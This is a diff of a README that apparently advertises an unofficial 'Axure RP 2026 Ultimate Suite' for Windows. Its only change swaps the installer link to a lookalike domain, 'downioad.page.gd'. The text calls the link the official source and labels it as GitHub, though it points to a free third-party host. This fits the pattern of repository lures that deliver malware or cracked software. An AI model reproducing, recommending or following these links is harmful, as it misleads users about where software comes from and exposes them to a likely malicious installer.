@@ -2,7 +2,7 @@
 
 The Axure RP 2026 Ultimate Suite is an innovative enhancement tool crafted specifically for Axure RP users on Windows desktop platforms. This suite introduces a range of features designed to optimize your prototyping workflow, from expanded template collections to performance improvements that make your design sessions more efficient. Whether you're a seasoned designer or new to prototyping, this tool offers valuable additions to the core Axure RP 2026 experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -49,4 +49,4 @@ A: Updates are released periodically to add new features, fix bugs, and improve 
 
 To get the latest version of the Axure RP 2026 Ultimate Suite, use the link below. This is the official download source and will always provide the most recent release.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
